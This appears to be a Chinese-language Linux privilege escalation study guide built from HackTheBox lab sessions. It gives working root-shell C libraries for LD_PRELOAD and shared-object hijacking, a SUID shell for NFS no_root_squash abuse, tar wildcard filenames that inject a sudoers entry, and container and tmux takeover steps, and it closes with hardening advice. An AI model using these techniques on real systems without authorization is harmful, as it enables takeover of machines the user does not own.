# Linux 提权

## 简介

1. 枚举是提权的关键所在，存在多个辅助脚本 ： ([LinEnum](https://github.com/rebootuser/LinEnum) ，[PEASS](https://github.com/carlospolop/PEASS-ng)),

```shell
# 查找可写目录
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
# 查找可写文件
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

## 本地提权技术

### 1. 内核漏洞利用

> 各种 Linux 内核版本都存在内核漏洞利用

```shell
# 查看内核级别以及 Linux 操作系统版本
uname -a
cat /etc/lsb-release 
# 查找对应的内核漏洞版本利用即可
```

### 2. 易受攻击的服务

> 在目标主机上可能存在被用来权限提升的服务漏洞，我们可以查看对应服务的版本，彬查找到其对应的 exp 利用即可

### 3. Cron 作业滥用

> Cron 作业通常用户管理任务，在利用该作业时，我们可以查找对应的目标人员 (eg: root) 设置的定时任务，查找目标人员设置的定时任务你是不是可以修改，如果可以，对定时任务进行修改以获取更高的权限

在这里我们可以使用 pspy 工具对正在运行的进程进行查看，当然我们也可以使用其他的命令以获取关于定时任务的更多信息

### 4. 特殊权限

详细介绍 --> [链接](pei-he/linux-quan-xian-suid-sgid-sticky.md)

> setuid 权限可以允许用户使用另一个用户的权限执行脚本或程序，通常具有提升的权限，该 setuid 位显示为 s

```shell
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
```

> setgid 权限是另一个特殊的权限，该权限允许我们运行二进制文件，就好像我们是创建它们的组的一部分一样

```shell
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

### 5. Sudo 滥用

> sudo 权限可以授予一个账号，以允许该账户以 root 权限允许一些命令

```shell
# 查看当前用户具有的 sudo 权限，有时候我们可能需要知道用户的密码才能列出 sudo 权限
sudo -l
	Matching Defaults entries for sysadm on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User sysadm may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/tcpdump
```

### 6. PATH 滥用

> PATH 是一个环境变量，指定可执行文件所在的目录集

```shell
# 查看 PATH 环境变量
echo $PATH
```

我们可以通过修改用户的 PATH 变量，来使其运行一个二进制文件

```shell
# 这个示例是将当前路径加入到 PATH 中。然后在当前路径添加一个 ls 可执行文件，就可以使用 ls
htb_student@NIX02:~$ PATH=.:${PATH}
htb_student@NIX02:~$ export PATH
htb_student@NIX02:~$ echo $PATH
htb_student@NIX02:~$ touch ls
htb_student@NIX02:~$ echo 'echo "PATH ABUSE!!"' > ls
htb_student@NIX02:~$ chmod +x ls
htb_student@NIX02:~$ ls
	PATH ABUSE!!
```

### 7. 通配符滥用

> 这里我们使用 tar 作为解释

```shell
htb_student@NIX02:~$ man tar

<SNIP>
Informative output
       --checkpoint[=N]
              每 N 条记录显示进度消息（默认 10）
       --checkpoint-action=ACTION
              在每个检查点上运行 ACTION
```

\--checkpoint-action 选项允许在到达检查点时执行 EXEC 操作（即，在 tar 命令执行后运行任意操作系统命令。）通过使用这些名称创建文件，当指定通配符时，-- checkpoint=1 和 --checkpoint-action=exec=sh root.sh 作为命令行选项传递给 tar,实践如下：

```shell
# 创建一个 cron 作业，每分钟备份 /toot 目录内容早 /tmp 中
*/01 * * * * cd /tmp && tar -zcf /tmp/backup.tar.gz *

htb_student@NIX02:~$ echo 'echo "cliff.moore ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
htb_student@NIX02:~$ echo "" > "--checkpoint-action=exec=sh root.sh"
htb_student@NIX02:~$ echo "" > --checkpoint=1

# 当执行后，我们就可以查看是否提升了权限
sudo -l
```

### 8. 凭据搜索

> 在枚举系统时，我们可以在 配置文件、shell 脚本、用户的 bash 历史文件、备份文件、数据库文件甚至是文本文件中查找，这些凭据有助于权限提升
>
> `在凭据搜索中，我们也应该尽可能搜索 SSH 密钥文件`

```shell
 find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
```

### 9. 共享库

> Linux 程序通常使用动态连接的共享对象库，库包含编译后的代码或其他数据，在 Linux 中存在两种类型的库： 静态共享库由 .a 文件扩展名表示 和 动态共享对象库由 .so 文件扩展名表示，编译时静态库作为程序的一部分不能改变，但是可以修改动态库以控制调用他们的程序执行。
>
> 有多种指定动态库位置的方法，因此系统将知道在程序执行时在哪里寻找它们。 这包括编译程序时的 -rpath 或 -rpath-link 标志，使用环境变量 LD\_RUN\_PATH 或 LD\_LIBRARY\_PATH，将库放在 /lib 或 /usr/lib 默认目录中，或指定另一个包含库的目录 /etc/ ld.so.conf 配置文件。
>
> `LD_PRELOAD`环境变量可以在二进制文件执行前加载库，该库的函数优先于默认函数

```shell
# 查看二进制文还能所需的共享对象
htb_student@NIX02:~$ ldd /bin/ls
```

#### 使用 LD\_PRELOAD 权限提升

```shell
# 当前用户的权限
htb_student@NIX02:~$ sudo -l

Matching Defaults entries for daniel.carter on NIX02:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD

User daniel.carter may run the following commands on NIX02:
    (root) NOPASSWD: /usr/sbin/apache2 restart  # 该用户可以以 root 权限指定 apache 服务器的重启
```

编写自定义共享库文件并编译

```shell
# root.c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}

# 编译
gcc -fPIC -shared -o root.so root.c -nostartfiles

# 在目标机执行
sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
```

### 10. 共享对象劫持

我们可以使用 ldd 打印二进制或共享对象所需的共享对象

```shell
htb_student@NIX02:~$ ldd payroll
    linux-vdso.so.1 =>  (0x00007ffcb3133000)
    libshared.so => /lib/x86_64-linux-gnu/libshared.so (0x00007f7f62e51000)  # 非标准库
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f7f62876000)
    /lib64/ld-linux-x86-64.so.2 (0x00007f7f62c40000)
```

在上面的输出中我们发现一个非标准库被列为二进制文件的依赖项，在这里我们可以使用 readelf 进行检查

```shell
htb_student@NIX02:~$ readelf -d payroll  | grep PATH
 0x000000000000001d (RUNPATH)            Library runpath: [/development]
```

该配置允许从所有用户可写的 /development 文件夹加载库，并且在这个文件夹的库优先于其他文件夹。

可以通过在 /development 中放置恶意库来利用此错误配置，这将优先于其他文件夹，因为首先检查此文件中的条目（在配置文件中出现其他文件夹之前）

```shell
# 移动共享文件
cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so

# 检查共享对象库位置是否发生变化
ldd payroll

# 执行，发现缺少 dbquery
htb_student@NIX02:~$ ./payroll 
	./payroll: symbol lookup error: ./payroll: undefined symbol: dbquery
```

编译包含 dbquery 函数的共享对象

```shell
#  src.c
#include<stdio.h>
#include<stdlib.h>

void dbquery() {
    printf("Malicious library loaded\n");
    setuid(0);
    system("/bin/sh -p");
} 

# 编译
gcc src.c -fPIC -shared -o /development/libshared.so

# 获取 WEBSHELL 
htb_student@NIX02:~$ ./payroll 

***************Inlane Freight Employee Database***************

Malicious library loaded
# id
uid=0(root) gid=1000(mrb3n) groups=1000(mrb3n)
```

### 11. 特权组

#### 1. LXC/LXD

> LXD 类似于 Docker,是 Ubuntu 的容器管理器，安转后，琐碎又的用户都会添加到 LXD 组，该组的成员可以通过创建 LXD 容器提升权限，使其具有特权
>
> LXD 初始化过程 --> [参考文章](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04)

```shell
devops@NIX02:~$ id
uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

# 获取一个 Alpine.zip 解压缩

# 初始化
devops@NIX02:~$ lxd init
# 导入本地镜像
devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
# 启动一个容器
devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true
# 挂载主机文件系统
devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
# 在容器实例中生成一个 shell 就可以访问 /root
devops@NIX02:~$ lxc start r00t
devops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh
~ # id
uid=0(root) gid=0(root)
```

#### 2. Docker

将用户置于 docker 组中本质上等同于无需密码即可对文件系统进行 root 级别访问。 docker 组的成员可以生成新的 docker 容器。 一个示例是运行命令 docker run -v /root:/mnt -it ubuntu。 此命令创建一个新的 Docker 实例，其中主机文件系统上的 /root 目录作为卷安装。 一旦容器启动，我们就可以浏览到挂载的目录并为 root 用户检索或添加 SSH 密钥。 这可以用于其他目录，例如 /etc，可用于检索 /etc/shadow 文件的内容以进行离线密码破解或添加特权用户。

#### 3. Disk

磁盘组中的用户可以完全访问 /dev 中包含的任何设备，例如 /dev/sda1，它通常是操作系统使用的主要设备。 拥有这些权限的攻击者可以使用 debugfs 以根级权限访问整个文件系统。 与 Docker 组示例一样，这可用于检索 SSH 密钥、凭据或添加用户。

#### 4.ADM

adm 组的成员能够读取存储在 /var/log 中的所有日志。 这不会直接授予 root 访问权限，但可以用来收集存储在日志文件中的敏感数据或枚举用户操作和运行的 cron 作业。

### 12.杂项技术

#### 1. 被动流量捕获

我们可以使用 tcpdump 来捕获网络流量，包括在某些情况下以明文形式传递的凭据，存在多种工具：[net-creds](https://github.com/DanMcInerney/net-creds)和[PCredz](https://github.com/lgandx/PCredz) 可以用于检查线路上传递的数据，

#### 2.弱 NFS 权限

> 网络文件系统 NFS 允许用户通过托管在 Unix/Linux 系统上的网络访问共享文件或目录， NFS 使用 TCP/UDP 端口 2049，可以通过发出命令远程列出任何可访问的挂载

```shell
# showmount -e列出了 NFS 客户端的 NFS 服务器的导出列表（或文件系统的访问控制列表）
showmount -e 10.129.2.12
	Export list for 10.129.2.12:
    /tmp             *
    /var/nfs/general *
```

NFS 的配置文件： /etc/exports

| 选项               | 描述                                                                                                      |
| ---------------- | ------------------------------------------------------------------------------------------------------- |
| root\_squash     | 如果使用root用户访问NFS共享，则改为该nfsnobody用户，即非特权账户。root 用户创建和上传的任何文件都将归nfsnobody用户所有，这可以防止攻击者上传带有 SUID 位设置的二进制文件。 |
| no\_root\_squash | 以本地 root 用户身份连接到共享的远程用户将能够以 root 用户身份在 NFS 服务器上创建文件。这将允许创建带有 SUID 位集的恶意脚本/程序。                           |

```shell
cat /etc/exports
    /var/nfs/general *(rw,no_root_squash)
    /tmp *(rw,no_root_squash)
```

例如，我们可以创建一个`/bin/sh`使用本地 root 用户执行的 SETUID 二进制文件。然后我们可以在`/tmp`本地挂载目录，将 root 拥有的二进制文件复制到 NFS 服务器，并设置 SUID 位。

```shell
# 创建一个简单的二进制文件，在本地挂载目录，复制它，并设置必要的权限
# shell.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
int main(void)
{
  setuid(0); setgid(0); system("/bin/bash");
}

htb@NIX02:/tmp$ gcc shell.c -o shell
root@Pwnbox:~$ sudo mount -t nfs 10.129.2.210:/tmp /mnt
root@Pwnbox:~$ cp shell /mnt
root@Pwnbox:~$ chmod u+s /mnt/shell
htb@NIX02:/tmp$ ./shell
root@NIX02:/tmp# id

uid=0(root) gid=0(root) 
```

#### 3. 劫持 Tmux 会话

> 用户可能会让`tmux`进程以特权用户身份运行，例如设置了弱权限的 root，这可能会被劫持。这可以通过以下命令来创建新的共享会话并修改所有权来完成。

```shell
htb@NIX02:~$ tmux -S /shareds new -s debugsess
htb@NIX02:~$ chown root:devs /shareds
# 如果我们可以破坏dev组中的用户，我们可以附加到这个会话并获得 root 访问权限
# 检查任何正在运行的tmux进程
htb@NIX02:~$  ps aux | grep tmux

# 确认权限
htb@NIX02:~$ ls -la /shareds 
	srw-rw---- 1 root devs 0 Sep  1 06:27 /shareds
	
# 查看我们的组成员资格
htb@NIX02:~$ id
	uid=1000(htb) gid=1000(htb) groups=1000(htb),1011(devs)

# 最后，附加到tmux会话并确认 root 权限
htb@NIX02:~$ tmux -S /shareds
	id
	uid=0(root) gid=0(root) groups=0(root)
```

### 13. Linux 加固

> 适当的 Linux 加固可以消除大部分本地权限升级的机会

#### 1. 更新和补丁

过时的 Linux 内核和已知易受攻击的内置和第三方服务版本存在许多快速简单的特权升级漏洞

#### 2. 配置管理

* 审核可写文件和目录以及任何使用 SUID 位设置的二进制文件。
* 确保任何 cron 作业和 sudo 权限使用绝对路径指定任何二进制文件。
* 不要将凭据以明文形式存储在全球可读的文件中。
* 清理主目录和 bash 历史记录。
* 确保低权限用户无法修改程序调用的任何自定义库。
* 删除任何可能增加攻击面的不必要的包和服务。
* 考虑实施[SELinux](https://www.redhat.com/en/topics/linux/what-is-selinux)，它在系统上提供额外的访问控制。

#### 3. 用户管理

> 限制每个系统上用户账户和管理账户数量并强制执行强密码策略、定期轮换密码以及通过将 /etc/security/opasswd 文件和 PAM 模块一起使用来限制用户重复使用旧密码

[Puppet](https://puppet.com/use-cases/configuration-management/)、[SaltStack](https://github.com/saltstack/salt)、[Zabbix](https://en.wikipedia.org/wiki/Zabbix)和[Nagios](https://en.wikipedia.org/wiki/Nagios)等配置管理自动化工具的模板可以自动执行此类检查，并可用于将消息推送到 Slack 频道或邮箱，以及通过其他方法。远程操作 (Zabbix) 和补救操作 (Nagios) 可用于在一组节点上查找并自动更正这些问题。Zabbix 等工具还具有校验和验证等功能，可用于版本控制和确认敏感二进制文件未被篡改。例如，通过[vfs.file.cksum](https://www.zabbix.com/documentation/4.0/manual/config/items/itemtypes/zabbix\_agent)文件。

#### 4. 审计

利用工具 [Lynis](https://github.com/CISOfy/lynis) 审计基于 Unix 的系统，该工具审核系统的当前配置并提供额外的强化提示，同时考虑到各种标准。它可供系统管理员等内部团队以及第三方（审计员和渗透测试员）使用，以获取系统当前安全配置的“基线”

克隆整个 repo 后，我们可以通过键入运行该工具`./lynis audit system`并收到完整的报告。

```shell
htb_student@NIX02:~$ ./lynis audit system

# 结果分为：警告、建议、整体扫描细节
```

## 工具

> https://github.com/wwl012345/Vuln-List
